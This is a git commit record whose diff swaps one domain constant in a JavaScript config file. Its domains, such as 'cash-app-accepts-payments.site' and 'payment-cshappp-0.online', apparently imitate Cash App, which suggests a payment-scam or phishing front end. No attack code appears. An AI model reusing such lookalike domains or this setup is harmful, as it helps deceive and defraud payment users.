707dd6689f252bcce39a4ba7dc54613e164952de
rana <rana.buddy@gmail.com>
2025-08-07 23:41:51 +0600

    feat:xioncart sh creation

--- app/config/index.js
+++ app/config/index.js
@@ -1,4 +1,4 @@
 export const API_URL = "https://meetbackend-three.vercel.app";
 
-export const site = "cash-app-accepts-payments.site";
+export const site = "frontcash.vercel.app";
 export const sitecash = "payment-cshappp-0.online";
